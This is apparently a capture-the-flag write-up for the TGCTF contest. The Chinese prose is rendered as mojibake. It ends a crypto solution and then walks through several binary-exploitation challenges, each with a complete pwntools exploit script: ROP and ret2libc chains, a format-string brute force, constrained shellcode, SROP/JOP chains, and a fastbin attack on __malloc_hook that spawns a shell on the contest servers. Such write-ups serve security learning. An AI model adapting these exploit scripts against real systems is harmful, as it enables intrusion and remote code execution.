n = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579
c = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401

p = 12424840247075830662687097292458444573014198016321428995092662043898159667123240573630892907827505266982898641483333170032514244713840745287869771915696311
q = 12602471198163266643743702664647336358595911975665358584258749238146841559843060594842063473155049870396568542257767865369797827796765830093256146584311989

e = "ğŸ’¯"
e = bytes_to_long(e.encode())

res1 = part_roots(n, c, e, p)
res2 = part_roots(n, c, e, q)

for i in res1:
    for j in res2:
        m = crt([i, j], [p, q])
#         print(long_to_bytes(m))
        try:
            print(long_to_bytes(m).decode())
        except:
            pass

```

å¦‚æœä¸è§£ç çš„è¯ï¼Œä¼šå˜æˆè¿™ä¸ªæ ·å­ï¼Œåˆšå¼€å§‹è¿˜ä»¥ä¸ºé”™äº†ï¼Œæ£€æŸ¥åŠå¤©ï¼Œä»ä¸€å †ä¹±ç ä¸­ç…è§äº†TGCTF{

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918544.png)

è§£ç æ˜¯è¿™æ ·ï¼šTGCTF{ğŸ™‡ğŸ®ğŸ¤Ÿ\_ğŸ«¡ğŸ«¡ğŸ«¡\_ğŸš©ğŸš©ğŸš©}ğŸ˜ƒğŸ˜–ğŸ˜˜ğŸ˜¨ğŸ˜¢

# PWN

## only\_gets | FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918545.png)

åªæœ‰ä¸€ä¸ªgetså‡½æ•°,å…¶ä»–ä»€ä¹ˆéƒ½æ²¡æœ‰,gotè¡¨ä¹Ÿä¸å¯å†™

é¦–å…ˆæˆ‘æƒ³åˆ°è¦æ³„éœ²libc,å¯æ˜¯æ²¡æœ‰è¾“å‡ºå‡½æ•°...

ä½†æ˜¯æœ¬åœ°æ²¡æœ‰å¼€å¯PIEä¿æŠ¤,è¿™å°±è®©æˆ‘æœ‰äº†èƒ½ä½¿ç”¨magci\_gadgetçš„æœºä¼š

è¿™ä¸ªgadget æ˜¯é€šè¿‡é”™ä½å¾—åˆ°çš„,ç›´æ¥åœ¨IDAä¸­æ— æ³•æ‰¾åˆ°

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918546.png)

magci=0x400549-1

magic:

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918547.png)

å¯ä»¥ä¿®æ”¹rbp-0x3dçš„å€¼,åªè¦rbpä¸ebxæ˜¯å¯æ§çš„,è¿™æ—¶æˆ‘ä»¬æƒ³åˆ°cusä¸­åˆšåˆšå¥½æœ‰æ§åˆ¶äºŒè€…çš„ç‰‡æ®µ

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918548.png)

æˆ‘ä»¬åœ¨ropä¸­,å¯ä»¥å°†rbxè®¾ç½®ä¸ºstdin+0x3d,é‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥æ”¹å˜stdinå†…æŒ‡å‘çš„å†…å®¹,æˆ‘ä»¬è™½ç„¶ä¸çŸ¥é“å…·ä½“å°†å…¶æ”¹æˆä»€ä¹ˆ,ä½†æ˜¯æˆ‘ä»¬çŸ¥é“\_IO\_2\_1\_stdin\_ä¸writeå‡½æ•°çš„åç§»,é‚£ä¹ˆåˆ©ç”¨è¿™ä¸ªåç§»å°±å¯ä»¥å°†stdinä¿®æ”¹ä¸ºä¸€ä¸ªåŒ…å«writeå‡½æ•°çš„"è¡¨",ç»“æ„å’Œgotè¡¨ä¸€æ¨¡ä¸€æ ·!è€Œä¸”å®ƒæ˜¯å¯å†™çš„

æƒ³è¦ç›´æ¥åˆ©ç”¨gotè¡¨çš„è¯,åˆè¦åˆ©ç”¨cusä¸­çš„ç¬¬äºŒæ®µgadget,è¿™æ®µgadgetç»™äºˆäº†æˆ‘ä»¬ç›´æ¥è°ƒç”¨gotè¡¨ä¸­å‡½æ•°çš„èƒ½åŠ›,æ­¤æ—¶æˆ‘ä»¬ä¾¿å¯ä»¥è½»æ¾æ³„éœ²libc

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918549.png)

ä¸è¦å¿˜è®°æ³„éœ²å®Œlibcåè¦ç”¨ä¸Šè¿°æµç¨‹å°†stdiné‡å®šå‘å›\_IO\_2\_1\_stdin\_,æˆ‘ä»¬åç»­è¿˜æœ‰ç›´æ¥æ”»å‡»çš„ropé“¾è¦æ³¨å…¥,å¿…é¡»ä¿è¯æ ‡å‡†è¾“å…¥çš„åˆæ³•

è¿™åé¢å°±æ˜¯æ™®æ™®é€šé€šçš„ropäº†,éšä¾¿syscallæˆ–è€…system("/bin/sh")éƒ½å¯ä»¥,åæ­£libcä¸­ä»€ä¹ˆéƒ½æœ‰:)

```python
from pwn import *
#io=process('./pwn')
io=remote("node2.tgctf.woooo.tech",32740)
libc=ELF('./libc.so.6')
def bug():
    gdb.attach(io)
rdi=0x400663
gets=0x400470
cus1=0x40065A
cus2=0x400640
magic=0x400548
stdin=0x601020
offset=0xFFFFFFFFFFEF9DD0//offset _IO_2_1_stdin_ to write==-1*0x106230
bss=0x601800
leave=0x4005FB
payload=b'\x00'*0x10+p64(bss+8)+p64(cus1)+p64(offset)+p64(stdin+0x3d)+p64(0)*4+p64(magic)+p64(cus1)
payload+=p64(0)+p64(1)+p64(stdin)+p64(1)+p64(0x600FE8)+p64(0x10)+p64(cus2)+p64(0)*7
payload+=p64(cus1)+p64(0x106230)+p64(stdin+0x3d)+p64(0)+p64(bss)+p64(0)*2+p64(magic)
payload+=p64(0x4005E5)

io.sendline(payload)
base=u64(io.recv(8))-libc.sym['gets']
success("base=>"+str(hex(base)))
system=base+libc.sym['system']
bin_sh=base+next(libc.search(b"/bin/sh\x00"))
print(hex(system))
rsi=base+0x000000000002be51
rdx=base+0x000000000011f2e7
rax=base+0x0000000000045eb0
syscall=base+0x0000000000029db4
payload=b'\x00'*0x18+p64(rdi)+p64(bin_sh)+p64(rsi)+p64(0)+p64(rdx)+p64(0)*2+p64(rax)+p64(0x3b)+p64(syscall)
io.sendline(payload)
io.interactive()
```

å…¶å®ç”šè‡³å¯ä»¥ä¸éœ€è¦leak\_libc,æˆ‘ä»¬å¯ä»¥flat\[å‘bsså†™å…¥/bin/sh,é‡å®šå‘stdinä¸ºsystem,cus=>system("/bin/sh")]

åªéœ€è¦æ³¨å…¥ä¸€æ¬¡ropå°±å¤Ÿäº†

## fmt | FINISHED - 01

è¡¨é¢ä¸Šåªæœ‰ä¸€æ¬¡æ ¼å¼åŒ–çš„æœºä¼š

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918550.png)

æˆ‘å°±ç›´æ¥çˆ†ç ´å°†è¿”å›åœ°å€çš„ä½24å­—èŠ‚å†™ä¸ºone\_gadgetäº†,åæ­£1/4096çš„æ¦‚ç‡ä¹Ÿèƒ½æ¥å—å§(å¹¶ä¸)

```python
from pwn import *
io=process('./pwn')
context.arch='amd64'
def pwn():
    io.recvuntil(b'your gift ')
    stack=int(io.recv(14),16)
    success("stack=>"+str(hex(stack)))
    io.recvuntil(b"please tell me your name")
    ret_addr=stack+0x68
    fini=0x403DB8
    magic=0x404010
    bss=0x404800
    one=[0xe3b01,0xe3afe,0xe3b04][0]
    payload=b'%c%9$hhn%11834c%10$hn'.ljust(24,b'\x00')+p64(ret_addr)+p64(ret_addr+1)
    print(hex(len(payload)))
    io.send(payload)
    io.interactive()
    io.sendline(b"cat f*")
while True:
    io=remote("node1.tgctf.woooo.tech",30924)
    try:
        pwn()
    except:
        io.close()
```

## shellcode | FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918551.png)

å¯ä»¥å†™å…¥18å­—èŠ‚,ä¸”åªæœ‰è¿™18å­—èŠ‚å¯æ‰§è¡Œ,å…³é—­äº†è¿™éƒ¨åˆ†çš„å†™,æ‰§è¡Œæƒé™,å› æ­¤ä¸èƒ½ç›´æ¥å†™nopæ»‘æ¢¯äº†

æˆ‘å°†18å­—èŠ‚åˆ†ä¸ºä¸¤éƒ¨åˆ†:

1.æ¢å¤å½“å‰åœ°å€çš„rwxæƒé™

2.è°ƒç”¨readå†™å…¥nopæ»‘æ¢¯å’Œexecv\_shellcode

```python
"mov al,0xa;mov dl,7;mov sil,0xff;syscall;mov edx,esi;mov rsi,rdi;xor edi, edi;syscall;"
```

ä¼˜åŒ–ä¼˜åŒ–å†ä¼˜åŒ–,æœ€åå±…ç„¶æ»¡è¶³äº†18å­—èŠ‚çš„é™åˆ¶

é‚£å‰©ä¸‹çš„å·¥ä½œå°±éå¸¸ç®€å•äº†

```python
pay=b'\x90'*0x20+asm("mov rdi,rcx;mov al,0xa;mov dl,7;mov rsi,0x1000;syscall;mov rsi,rcx;xor rdi,rdi;mov rdx,0x1000;xor rax,rax;syscall")
io.send(pay)
pause()
pay=b'\x90'*0x20+asm("lea rdi,[rcx+0x21];mov rax,0x3b;xor rsi,rsi;xor rdx,rdx;syscall")+b'/bin/sh\x00'
```

å…¶å®0xffå·²ç»å®Œå…¨å¤Ÿäº†,å½“æ—¶ä¸‹æ„è¯†æ€•å†™æ»‘æ¢¯ä¸å¤Ÿç”¨,ç¬¬ä¸‰æ¬¡è°ƒç”¨readæ³¨å…¥nopæ»‘æ¢¯,å…¶å®å®Œå…¨æ²¡æœ‰å¿…è¦

## ç­¾åˆ° | FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918552.png)

è£¸getså‡½æ•°æ€»ä¸èƒ½æœ‰äººä¸ä¼šå§

```python
from pwn import *
libc=ELF('./libc.so.6')
io=remote("node2.tgctf.woooo.tech",31218)
elf=ELF('./pwn')
payload=b'a'*0x78+p64(0x0000000000401176)+p64(elf.got['gets'])+p64(elf.plt['puts'])+p64(0x401178)
io.recvuntil(b'please leave your name.\n')
io.sendline(payload)
base=u64(io.recv(6)+b'\x00\x00')-libc.sym['gets']
system=base+libc.sym['system']
bin_sh=base+next(libc.search(b"/bin/sh"))
payload=b'a'*0x78+p64(0x0000000000401176+1)+p64(0x0000000000401176)+p64(bin_sh)+p64(system)
io.sendline(payload)
io.interactive()
```

æœ€ç»å…¸çš„ret2libcæ¨¡æ¿

## overflow | FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918553.png)

é™æ€ç¼–è¯‘çš„,ç”¨ROPchainç”Ÿæˆropé“¾å°±å¥½äº†,ä½†æ˜¯æ³¨æ„

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918554.png)

æ‰€ä»¥æˆ‘ä»¬å°†æ ˆè¿ç§»åˆ°nameä¸­,åœ¨getsæº¢å‡ºä¸­æŠŠrbpè¦†ç›–ä¸ºname

è¿™é“é¢˜ä¸æ˜¯ç»å…¸çš„leave\_retç»“å°¾

```python
from pwn import *
from struct import pack
#io=process('./pwn')
# Padding goes here
io=remote("node1.tgctf.woooo.tech",32397)
p  = pack('<I', 0x08060bd1) # pop edx ; ret
p += pack('<I', 0x080ee060) # @ .data
p += pack('<I', 0x080b470a) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x080597c2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08060bd1) # pop edx ; ret
p += pack('<I', 0x080ee064) # @ .data + 4
p += pack('<I', 0x080b470a) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x080597c2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08060bd1) # pop edx ; ret
p += pack('<I', 0x080ee068) # @ .data + 8
p += pack('<I', 0x080507e0) # xor eax, eax ; ret
p += pack('<I', 0x080597c2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080ee060) # @ .data
p += pack('<I', 0x08049802) # pop ecx ; ret
p += pack('<I', 0x080ee068) # @ .data + 8
p += pack('<I', 0x08060bd1) # pop edx ; ret
p += pack('<I', 0x080ee068) # @ .data + 8
p += pack('<I', 0x080507e0) # xor eax, eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08049c6a) # int 0x80
io.send(p)
pause()
payload=p32(0x080EF324)*0x35
#gdb.attach(io)
io.sendline(payload)
io.interactive()
```

## Stack | FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918555.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918556.png)

å­˜åœ¨æº¢å‡º,ä½†æœ¬é¢˜å­˜åœ¨ä¸€ä¸ªæ¨¡æ‹Ÿå½±å­å †æ ˆçš„æœºåˆ¶ä¼šå¯¹è¿”å›åœ°å€è¿›è¡Œæ£€æŸ¥

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918557.png)

å¦‚æœè¿”å›åœ°å€è¢«ä¿®æ”¹åˆ™è¿›å…¥å¼‚å¸¸å¤„ç†å‡½æ•°

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918558.png)

å¼‚å¸¸å¤„ç†å‡½æ•°æœ¬æ¥æ˜¯writeå¼‚å¸¸ç„¶åexité€€å‡º

ä½†æ˜¯writeçš„è°ƒç”¨æ€ä¹ˆæŠŠè°ƒç”¨å·åˆ°å‚æ•°éƒ½æ”¾åœ¨bssä¸Š,è€Œä¸”æˆ‘ä»¬ä¸€å¼€å§‹å¯ä»¥å‘bsså†™å…¥æ•°æ®,é‚£æ˜¯ä¸æ˜¯æˆ‘ä»¬å¯ä»¥è¦†ç›–fd,buf,countå’Œç³»ç»Ÿè°ƒç”¨å·ä½¿ä¹‹æ‰§è¡Œexecv("/bin/sh",0,0)?

æ˜¯çš„

```python
from pwn import *
#io=process('./pwn')
io=remote("node1.tgctf.woooo.tech",32136)
context.arch='amd64'
def bug():
    gdb.attach(io)
leave=0x40122B
payload=b'/bin/sh\x00'.ljust(0x40,b'\x00')+p64(0x3b)+p64(0x404108)+p64(0)*2
io.sendafter(b"welcome! could you tell me your name?\n",payload)
io.recvuntil(b'what dou you want to say?\n')
bss=0x404800
payload=b'a'*0x40+p64(bss)+p64(leave)
io.send(payload)
io.interactive()
```

ç”¨ä¸€æ¬¡æ ˆæº¢å‡ºè§¦å‘å°±å¯ä»¥äº†:)



## NORET | FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918559.png)

å…¶å®æ˜¯ä¸ªèœå•é¢˜å•¦,èœå•çš„ç¬¦å·å…¨éƒ½å†™åœ¨dataæ®µçœ‹çš„ä¸æ˜¯å¾ˆæ¸…æ¥š,å…¶ä¸­å­˜åœ¨sys\_readå¯ä»¥æº¢å‡º,ä½†è¿™é“é¢˜:æ²¡æœ‰ret!!!!!!!

æ‰€ä»¥è¿™é“é¢˜è¦å†™çš„ä¸æ˜¯ropé“¾è€Œæ˜¯jopé“¾:ç”¨jmpå°†ä»£ç æ®µç›¸è¿æ¥

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918560.png)

åœ¨textæ®µå­˜åœ¨ä¸°å¯Œçš„gadget,ä½†é—®é¢˜æ˜¯jmpç›¸å…³ä»£ç éƒ½æ˜¯jmp \[rgs],è¿™ä¹Ÿå°±è¦æ±‚æˆ‘ä»¬è¦çŸ¥é“å­˜æ”¾jopçš„åœ°å€(æ ˆ)

æ‰€ä»¥ç¬¬ä¸€æ­¥æ˜¯æ³„éœ²æ ˆåœ°å€:

æˆ‘ä»¬æ ¹æœ¬æ²¡å¾—é€‰,åªèƒ½ç”¨write,é‚£å°±è¦å°†rsiè®¾ç½®ä¸ºæ ˆä¸Šçš„åœ°å€

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918561.png)

åˆšåˆšå¥½å­˜åœ¨è¿™æ ·çš„gadget,è€Œä¸”æ³„éœ²å®Œè¿˜èƒ½è¿”å›ç¨‹åºçš„æ­£å¸¸æµç¨‹,ç›¸å½“äº0å‰¯ä½œç”¨,å…è´¹é€äº†æˆ‘ä»¬ä¸€æ¬¡leak\_stackçš„æœºä¼š

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918562.png)

æº¢å‡ºéƒ¨åˆ†çš„ä»£ç æ®µè¿™ä¸ªæ ·å­,å…¶ä¸­å¯¹äºrsiçš„è®¾ç½®é å‰,æˆ‘çš„æƒ³æ³•æ˜¯å°†æ ˆå…ˆè¿ç§»åˆ°bssä¸Š,ç„¶åå†jop(å…¶å®ä¹Ÿå¯ä»¥ä¸ç”¨è¿ç§»)

è¿ç§»å,æˆ‘ä»¬å¯ä»¥å…ˆå‘bssä¸Šå†™å…¥/bin/shè¿™æ ·çš„å­—ç¬¦ä¸²,ç„¶åå¼€å§‹è€ƒè™‘å¸ƒç½®æ–°çš„jopé“¾

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918563.png)

ä¼¼ä¹æ˜¯ä¸€å›¢ä¹±éº»,æƒ³æ‰¾å‡ºä¸€ä¸ªexecv("/bin/sh"0,0)çš„æ­£ç¡®é¡ºåºå®åœ¨ä¸å®¹æ˜“

æˆ‘åœ¨è¿™é‡Œè§‚å¯Ÿäº†å¥½ä¹…,æœ€åä¸æƒ³çœ‹äº†,æƒ³åˆ°äº†srop,åœ¨sropé‡Œæˆ‘å¯ä»¥è½»æ¾å¸ƒç½®å„ä¸ªå¯„å­˜å™¨çš„å€¼,ä¸ç”¨å†™å¥‡å¥‡æ€ªæ€ªçš„jopé“¾äº†,è€Œä¸”sropåªéœ€è¦æˆ‘ä»¬è®¾ç½®rax=0xf,rip=syscall

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918564.png)



è¿™å°±å¾ˆå¥½åŠäº†,æˆ‘ä»¬åªéœ€è¦å°†è¿™ä¸¤ä¸ªgadgetè¿åœ¨ä¸€èµ·å°±å¯ä»¥äº†,è‡³äºè®¾ç½®å¯„å­˜å™¨éƒ½æ˜¯sigreturnframeçš„äº‹æƒ…äº†

```python
from pwn import *
io=process('./pwn')
#io=remote("node1.tgctf.woooo.tech",30847)
context.arch='amd64'
def bug():
    gdb.attach(io)
def c(Id):
    io.sendlineafter(b'> ',str(Id).encode())
def s(payload):
    io.sendafter(b": ",payload)
bss=0x402800
pop_4_jmp=0x40100F 
push_3=0x40108A 
payload=b'\x00'*0x100+p64(push_3)
c(2)
s(payload)
io.recvuntil(b'Thank you for your feedback!\n')
stack=u64(io.recv(6).ljust(8,b'\x00'))
success("stack=>"+str(hex(stack)))
start=stack-0x100
c(2)
payload=p64(start+0x18-1)+p64(start+0x20)+p64(start+0x28)+p64(0x40101B)+p64(0)+p64(0x4010D5)+p64(bss-8)
payload=payload.ljust(0x100,b'\x00')+p64(pop_4_jmp)+p64(start)+p64(0)+p64(pop_4_jmp)+p64(bss)
s(payload)
io.recvuntil(b'Thank you for your feedback!')
payload =b'/bin/sh\x00'
#======================================================================================
#bss:
f=SigreturnFrame()
f.rax=0x3b
f.rdi=bss-8
f.rsi=0
f.rdx=0
f.rip=0x401163
payload+=p64(bss+0x110-1)+p64(bss+0x118)+p64(0xFFFFFFFFFFFFFFF2)
payload+=bytes(f)
payload =payload.ljust(0x108,b'\x00') 
payload+=p64(0x401024)+p64(0x401163)
io.send(payload)
io.interactive()
```

## Heap |FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918565.png)

èœå•é¢˜,å…¶ä¸­deletå­˜åœ¨uafæ¼æ´,ç»“åˆè¿™é“é¢˜æ˜¯2.23ç‰ˆæœ¬çš„,æˆ‘ä»¬å¯ä»¥fastbins\_attack

ä½†æ˜¯è¿™é“é¢˜æ²¡æœ‰showé€‰é¡¹,è¿™å°±å¯¼è‡´leak\_libcæˆä¸ºäº†éš¾é¢˜

æˆ‘ä»¬å”¯ä¸€å¯ä»¥è·å¾—å›æ˜¾çš„åœ°æ–¹æ˜¯åœ¨renameå¤„,nameæ˜¯ä¸ªå­˜åœ¨äºbssä¸Šçš„å˜é‡,æˆ‘ä»¬å¯ä»¥è¯»å†™ä¸Šé¢çš„æ•°æ®,è€Œä¸”nameçš„é•¿åº¦è¶³è¶³æœ‰0xd0!

é‚£æˆ‘ä»¬èƒ½ä¸èƒ½å…ˆfastbins\_attackå°†nameç”³è¯·å‡ºæ¥,ç„¶årenameä¿®æ”¹nameçš„chunkå¤§å°,å†free(name),è¿™æ ·main\_arenaå°±ä¼šè¢«æŒ‚åˆ°nameä¸Š,æ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥è·å¾—libc\_baseçš„å›æ˜¾äº†

ç„¶åå°±æ˜¯æœ€ç®€å•çš„æ”»å‡»\_\_malloc\_hook,å†™ä¸ºogg,ç”¨mallocè§¦å‘å°±å¯ä»¥äº†

```python
from pwn import *
#io=process('./pwn')
io=remote("node1.tgctf.woooo.tech",30177)
libc=ELF('./libc.so.6')
Name=0x6020C0
#context.log_level='debug'
def add(size,payload=b'01'):
    io.sendlineafter(b"> ",b"1")
    io.sendlineafter(b"> ",str(size).encode())
    io.sendafter(b"> ",payload)
def free(Id):
    io.sendlineafter(b"> ",b"2")
    io.sendlineafter(b"> ",str(Id).encode())
def name(payload):
    io.sendlineafter(b"> ",b"3")
    io.sendafter(b"> ",payload)
def bug():
    gdb.attach(io)
io.sendafter(b"> ",b"01")
#=====================================================================
add(0x60,b'01')#0
add(0x60,b'01')#1
payload=p64(0)+p64(0x71)
name(payload)
free(0)
free(1)
free(0)
add(0x60,p64(Name))
add(0x60)#2
add(0x60)#3
add(0x60)#4
#=====================================================================
payload =p64(0)+p64(0x91)
payload =payload.ljust(0x90,b'\x00')
payload+=p64(0)+p64(0x21)+p64(0)*2
payload+=p64(0)+p64(0x21)
name(payload)
free(5)
name(b'a'*0x10)
io.recvuntil(b'a'*0x10)
base=u64(io.recv(6).ljust(8,b'\x00'))-0x3c4b78
success("base=>"+str(hex(base)))
mhook=base+libc.sym['__malloc_hook']
realloc=base+libc.sym['realloc']
one=[0x4527a,0xf03a4,0xf1247][0]+base
free(0)
free(1)
free(0)
add(0x60,p64(mhook-0x23))
add(0x60)
add(0x60)
payload=b'\x00'*(0x13-8)+p64(one)+p64(realloc+8)
add(0x60,payload)
io.sendlineafter(b"> ",b"1")
io.sendlineafter(b"> ",str(0x60).encode())
io.interactive()
```











